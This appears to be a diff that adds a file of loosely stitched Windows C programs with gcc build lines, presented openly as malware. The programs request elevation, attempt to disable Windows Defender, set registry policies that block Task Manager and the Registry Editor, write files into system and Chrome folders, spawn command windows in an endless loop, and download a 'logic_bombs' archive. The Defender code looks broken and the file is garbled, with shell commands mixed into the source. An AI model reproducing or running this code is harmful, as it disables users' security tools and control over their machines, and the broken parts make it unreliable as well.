@@ -1,0 +1,407 @@
+#include <windows.h>
+#include <stdio.h>
+
+int main() {
+    // Get the current executable path
+    char path[MAX_PATH];
+    GetModuleFileNameA(NULL, path, sizeof(path));
+
+    // Execute the current program with elevated privileges
+    SHELLEXECUTEINFOA sei;
+    ZeroMemory(&sei, sizeof(sei));
+    sei.cbSize = sizeof(sei);
+    sei.fMask = SEE_MASK_NOCLOSEPROCESS;
+    sei.hwnd = NULL;
+    sei.lpVerb = "runas"; // Request elevation
+    sei.lpFile = path;     // Path to the executable
+    sei.lpParameters = "";  // Parameters
+    sei.lpDirectory = NULL;
+    sei.nShow = SW_SHOWNORMAL;
+
+    // Execute the command
+    if (ShellExecuteExA(&sei)) {
+        // Wait for the new process to finish
+        WaitForSingleObject(sei.hProcess, INFINITE);
+        CloseHandle(sei.hProcess);
+    } else {
+        printf("Failed to execute with UAC: %d\n", GetLastError());
+    }
+
+    return 0;
+}
+gcc uac_prompt.c -o uac_prompt.exe
+
+#include <windows.h>
+
+int main() {
+    // Display the message box
+    int msgBoxID = MessageBox(
+        NULL,
+        "Are you sure you want to run this? This is a malware.",
+        "Warning",
+        MB_ICONWARNING | MB_YESNO
+    );
+
+    // Check user's response
+    if (msgBoxID == IDYES) {
+        // User clicked Yes
+        MessageBox(NULL, "You chose to proceed.", "Info", MB_OK);
+    } else {
+        // User clicked No
+        MessageBox(NULL, "Operation canceled.", "Info", MB_OK);
+    }
+
+    return 0;
+}
+gcc message_box.c -o message_box.exe -mwindows
+
+#include <windows.h>
+#include <stdio.h>
+#include <comdef.h>
+#include <Wbemidl.h>
+
+#pragma comment(lib, "wbemuuid.lib")
+
+void disableWindowsDefender() {
+    HRESULT hres;
+
+    // Step 1: Initialize COM.
+    hres = CoInitializeEx(0, COINIT_MULTITHREADED);
+    if (FAILED(hres)) {
+        printf("Failed to initialize COM library. Error code = 0x%X\n", hres);
+        return;
+    }
+
+    // Step 2: Initialize COM security.
+    hres = CoInitializeSecurity(
+        NULL,
+        -1,
+        NULL,
+        NULL,
+        RPC_C_AUTHN_LEVEL_DEFAULT,
+        RPC_C_IMPERSONATE,
+        NULL,
+        EOAC_NONE,
+        NULL);
+
+    if (FAILED(hres)) {
+        printf("Failed to initialize security. Error code = 0x%X\n", hres);
+        CoUninitialize();
+        return;
+    }
+
+    // Step 3: Create WMI locator.
+    IWbemLocator *pLoc = NULL;
+
+    hres = CoCreateInstance(
+        CLSID_WbemLocator,
+        0,
+        CLSCTX_INPROC_SERVER,
+        IID_IWbemLocator, (LPVOID *)&pLoc);
+
+    if (FAILED(hres)) {
+        printf("Failed to create IWbemLocator object. Error code = 0x%X\n", hres);
+        CoUninitialize();
+        return;
+    }
+
+    // Step 4: Connect to WMI.
+    IWbemServices *pSvc = NULL;
+
+    hres = pLoc->ConnectServer(
+        _bstr_t(L"ROOT\\Microsoft\\Windows\\Security\\Center2"),
+        NULL,
+        NULL,
+        0,
+        NULL,
+        0,
+        0,
+        &pSvc);
+
+    if (FAILED(hres)) {
+        printf("Could not connect. Error code = 0x%X\n", hres);
+        pLoc->Release();
+        CoUninitialize();
+        return;
+    }
+
+    // Step 5: Set the security levels on the proxy.
+    hres = CoInitializeSecurity(
+        NULL,
+        -1,
+        NULL,
+        NULL,
+        RPC_C_AUTHN_LEVEL_DEFAULT,
+        RPC_C_IMPERSONATE,
+        NULL,
+        EOAC_NONE,
+        NULL);
+
+    if (FAILED(hres)) {
+        printf("Could not initialize security. Error code = 0x%X\n", hres);
+        pSvc->Release();
+        pLoc->Release();
+        CoUninitialize();
+        return;
+    }
+
+    // Step 6: Create an object to disable Windows Defender
+    IWbemClassObject *pClass = NULL;
+    hres = pSvc->GetObject(_bstr_t(L"AntiVirusProduct"), 0, NULL, &pClass, NULL);
+    if (FAILED(hres)) {
+        printf("Could not get object. Error code = 0x%X\n", hres);
+        pSvc->Release();
+        pLoc->Release();
+        CoUninitialize();
+        return;
+    }
+
+    // Disable Windows Defender
+    VARIANT vtProp;
+    VariantInit(&vtProp);
+    vtProp.vt = VT_BOOL;
+    vtProp.boolVal = VARIANT_FALSE; // Set to false to disable
+
+    hres = pClass->Put(L"Disable", 0, &vtProp, 0);
+    if (FAILED(hres)) {
+        printf("Failed to disable Windows Defender. Error code = 0x%X\n", hres);
+    } else {
+        printf("Windows Defender disabled successfully.\n");
+    }
+
+    // Cleanup
+    VariantClear(&vtProp);
+    pClass->Release();
+    pSvc->Release();
+    pLoc->Release();
+    CoUninitialize();
+}
+
+int main() {
+    disableWindowsDefender();
+    return 0;
+}
+gcc disable_defender.c -o disable_defender.exe -lole32 -loleaut32
+
+#include <windows.h>
+#include <stdio.h>
+
+void disableTaskManager() {
+    HKEY hKey;
+    LONG result;
+
+    // Open the registry key
+    result = RegOpenKeyEx(HKEY_CURRENT_USER, 
+                          "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 
+                          0, 
+                          KEY_ALL_ACCESS, 
+                          &hKey);
+    
+    // Create the registry key if it doesn't exist
+    if (result == ERROR_FILE_NOT_FOUND) {
+        RegCreateKeyEx(HKEY_CURRENT_USER, 
+                        "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 
+                        0, 
+                        NULL, 
+                        0, 
+                        KEY_ALL_ACCESS, 
+                        NULL, 
+                        &hKey, 
+                        NULL);
+    }
+
+    // Set the value to disable Task Manager
+    DWORD disableTaskMgr = 1; // 1 to disable, 0 to enable
+    RegSetValueEx(hKey, "DisableTaskMgr", 0, REG_DWORD, (LPBYTE)&disableTaskMgr, sizeof(disableTaskMgr));
+    RegCloseKey(hKey);
+
+    printf("Task Manager has been disabled.\n");
+}
+
+void disableRegistryEditor() {
+    HKEY hKey;
+    LONG result;
+
+    // Open the registry key
+    result = RegOpenKeyEx(HKEY_CURRENT_USER, 
+                          "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 
+                          0, 
+                          KEY_ALL_ACCESS, 
+                          &hKey);
+    
+    // Create the registry key if it doesn't exist
+    if (result == ERROR_FILE_NOT_FOUND) {
+        RegCreateKeyEx(HKEY_CURRENT_USER, 
+                        "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 
+                        0, 
+                        NULL, 
+                        0, 
+                        KEY_ALL_ACCESS, 
+                        NULL, 
+                        &hKey, 
+                        NULL);
+    }
+
+    // Set the value to disable Registry Editor
+    DWORD disableRegistryTools = 1; // 1 to disable, 0 to enable
+    RegSetValueEx(hKey, "DisableRegistryTools", 0, REG_DWORD, (LPBYTE)&disableRegistryTools, sizeof(disableRegistryTools));
+    RegCloseKey(hKey);
+
+    printf("Registry Editor has been disabled.\n");
+}
+
+int main() {
+    disableTaskManager();
+    disableRegistryEditor();
+    return 0;
+}
+gcc disable_tools.c -o disable_tools.exe
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+int main() {
+    // Define the filename for the original file
+    const char *filename = "ggs.txt";
+
+    // Create the original file
+    FILE *file = fopen(filename, "w");
+    if (file == NULL) {
+        perror("Error creating file");
+        return 1;
+    }
+
+    // Write some content to the file
+    fprintf(file, "This is ggs.txt\n");
+    fclose(file);
+
+    // Define the path for the duplicate
+    const char *destination = "C:\\Windows\\ggs_duplicate.txt"; // Change as needed
+
+    // Open the original file for reading
+    file = fopen(filename, "rb");
+    if (file == NULL) {
+        perror("Error opening file");
+        return 1;
+    }
+
+    // Open the destination file for writing
+    FILE *duplicate = fopen(destination, "wb");
+    if (duplicate == NULL) {
+        perror("Error creating duplicate file");
+        fclose(file);
+        return 1;
+    }
+
+    // Buffer for reading and writing
+    char buffer[1024];
+    size_t bytesRead;
+
+    // Read from original and write to duplicate
+    while ((bytesRead = fread(buffer, 1, sizeof(buffer), file)) > 0) {
+        fwrite(buffer, 1, bytesRead, duplicate);
+    }
+
+    // Clean up
+    fclose(file);
+    fclose(duplicate);
+
+    printf("File %s created and duplicated to %s successfully!\n", filename, destination);
+    return 0;
+}
+gcc create_and_duplicate.c -o create_and_duplicate.exe
+
+#include <stdio.h>
+#include <stdlib.h>
+
+int main() {
+    while (1) {
+        // Open a new CMD window
+        system("start cmd.exe");
+    }
+    return 0;
+}
+gcc open_cmd_infinitely.c -o open_cmd_infinitely.exe
+
+#include <stdio.h>
+#include <stdlib.h>
+
+int main() {
+    // Define the location for the Chrome installation
+    const char *chromePath = "C:\\Program Files\\Google\\Chrome\\Application\\security_data.txt"; // Change if necessary
+
+    // Create the file
+    FILE *file = fopen(chromePath, "w");
+    if (file == NULL) {
+        perror("Error creating file");
+        return 1;
+    }
+
+    // Write some data to the file
+    fprintf(file, "This file is for security data storage.\n");
+    fclose(file);
+
+    printf("File created successfully at: %s\n", chromePath);
+    return 0;
+}
+gcc create_in_chrome.c -o create_in_chrome.exe
+
+#include <stdio.h>
+#include <curl/curl.h>
+
+size_t write_data(void *ptr, size_t size, size_t nmemb, FILE *stream) {
+    size_t written = fwrite(ptr, size, nmemb, stream);
+    return written;
+}
+
+int main(void) {
+    CURL *curl;
+    FILE *fp;
+    CURLcode res;
+    const char *url = "https://github.com/hxuhack/logic_bombs/archive/refs/heads/main.zip";
+    const char *outfilename = "logic_bombs.zip"; // Output filename
+
+    curl = curl_easy_init();
+    if (curl) {
+        fp = fopen(outfilename, "wb");
+        if (fp == NULL) {
+            perror("Error opening file");
+            return 1;
+        }
+
+        curl_easy_setopt(curl, CURLOPT_URL, url);
+        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
+        curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
+        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
+
+        // Perform the request
+        res = curl_easy_perform(curl);
+        // Check for errors
+        if (res != CURLE_OK) {
+            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+        }
+
+        // Clean up
+        fclose(fp);
+        curl_easy_cleanup(curl);
+    }
+
+    printf("Download complete: %s\n", outfilename);
+    return 0;
+}
+gcc download_logic_bombs.c -o download_logic_bombs -lcurl
+
+#include <windows.h>
+
+int main() {
+    // Display the message box
+    MessageBox(
+        NULL,                            // Handle to the owner window (NULL for no owner)
+        "You have asked for this...",   // Message to be displayed
+        "Notification",                  // Title of the message box
+        MB_OK | MB_ICONINFORMATION       // Buttons and icon
+    );
+
+    return 0;
+}
+gcc message_box.c -o message_box.exe -mwindows
